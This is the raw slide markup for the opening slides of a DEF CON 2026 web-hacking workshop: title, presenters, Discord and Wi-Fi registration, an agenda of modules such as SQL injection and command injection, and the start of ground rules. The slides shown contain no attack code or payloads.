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ienZjbm8dPCPw+YYXBKllDZWCO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3f68c87d06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g3f68c87d06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 name="Google Shape;26;g3f68c87d06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2" name="Google Shape;40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2" name="Google Shape;45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3" name="Google Shape;51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2" name="Google Shape;842;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7" name="Google Shape;91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iscord.gg/S9BNzF3uA" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://wifireg.defcon.org" TargetMode="Externa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0.png"/><Relationship Id="rId5"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 name="Shape 15"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Google Shape;16;p1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="9144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400"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ ./webhacking101 --start _</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Google Shape;17;p1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1965960"/>
            <a:ext cx="10911535"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6400"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="6400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>webhacking101</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="6400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Google Shape;18;p1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3200400"/>
            <a:ext cx="10911535"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2400"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="2400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="58A6FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Hands-On Web Exploit Development</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="2400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Google Shape;19;p1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3794760"/>
            <a:ext cx="10911535"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1" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Watch what the app does. Bend it. Chain it to root.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="20" name="Google Shape;20;p1"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4617720"/>
            <a:ext cx="5029200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Google Shape;21;p1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4754880"/>
            <a:ext cx="10972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Cale “not an LLM” Smith   ·   Luke Cycon   ·   Young Kim   ·   Ruchik Dave</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640080" y="5212080"/>
            <a:ext cx="10058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DEF CON · 2026  ·  half-day workshop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 name="Shape 27"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Google Shape;28;g3f68c87d06f_0_0"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="572450" y="1526325"/>
            <a:ext cx="3000000" cy="386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sng" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://discord.gg/S9BNzF3uA</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E6EDF3"/>
              </a:buClr>
              <a:buSzPts val="3800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="3200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Browse to and register at </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="3200" u="sng" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
                <a:hlinkClick r:id="rId4">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>wifireg.defcon.org</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="3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E6EDF3"/>
              </a:buClr>
              <a:buSzPts val="3800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="3200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Connect to Defcon-WPA3</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="3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lt1"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
              <a:sym typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Google Shape;29;g3f68c87d06f_0_0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="566928"/>
            <a:ext cx="9144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Join us at Discord</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Google Shape;30;g3f68c87d06f_0_0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="868680"/>
            <a:ext cx="109116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Discord</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Google Shape;31;g3f68c87d06f_0_0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="6382512"/>
            <a:ext cx="91500" cy="9150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 name="Google Shape;32;g3f68c87d06f_0_0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="804672" y="6254496"/>
            <a:ext cx="365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33" name="Google Shape;33;g3f68c87d06f_0_0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11002975" y="6254496"/>
            <a:ext cx="548700" cy="32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a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="900" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="34" name="Google Shape;34;g3f68c87d06f_0_0"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3963647" y="1526330"/>
            <a:ext cx="4815720" cy="48157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 name="Shape 39"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Google Shape;40;p2"/>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WHOAMI</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Google Shape;41;p2"/>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Four hackers, one method</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Google Shape;42;p2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1965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3" name="Google Shape;43;p2"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="2122871"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Google Shape;44;p2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="1920240"/>
            <a:ext cx="46634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Who we are</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Google Shape;45;p2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="2286000"/>
            <a:ext cx="466344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Practitioners who pop real apps for a living - not a vendor pitch.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Google Shape;46;p2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="30175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7" name="Google Shape;47;p2"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="3174431"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Google Shape;48;p2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="2971800"/>
            <a:ext cx="46634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What this is</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Google Shape;49;p2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="3337560"/>
            <a:ext cx="466344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 hands-on, lab-driven intro to finding and weaponizing web bugs, using nothing but the browser you already have.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Google Shape;50;p2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="406908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1" name="Google Shape;51;p2"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="4225991"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Google Shape;52;p2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="4023360"/>
            <a:ext cx="466344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What it is not</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Google Shape;53;p2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="4389120"/>
            <a:ext cx="466344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Not a tool tour. No proxy, no scanner, no setup. The lab prints what the server did with your input.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Google Shape;54;p2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="1920240"/>
            <a:ext cx="4983480" cy="3566160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 2051"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6839712" y="215798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7077456" y="215798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2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="215798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2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7680960" y="1993392"/>
            <a:ext cx="3703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~/agenda</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="59" name="Google Shape;59;p2"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="2450592"/>
            <a:ext cx="4983480" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="Google Shape;60;p2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="2578608"/>
            <a:ext cx="4434840" cy="27432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4 hours, two breaks, hands-on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modules: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00  approach</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01  foundations (how http works)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02  access control &amp; idor</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03  sql injection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04  command injection (rce)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05  auth, session</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Google Shape;61;p2"/>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2"/>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63" name="Google Shape;63;p2"/>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8" name="Shape 68"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="Google Shape;69;p3"/>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GROUND RULES</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="Google Shape;70;p3"/>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Bring this, relax about the rest</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="Google Shape;71;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1965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2" name="Google Shape;72;p3"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="2122871"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="Google Shape;73;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="1920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A laptop and a web browser</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="Google Shape;74;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="2286000"/>
            <a:ext cx="484632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That is the whole list. Nothing to install, no VM, no SSH, no accounts to make. Every lab runs in the browser you already have.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="Google Shape;75;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="30175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6" name="Google Shape;76;p3"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="3174431"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="Google Shape;77;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="29718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No coding required</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="Google Shape;78;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="3337560"/>
            <a:ext cx="484632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If you can browse a website and paste text into a box, you can finish every lab.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
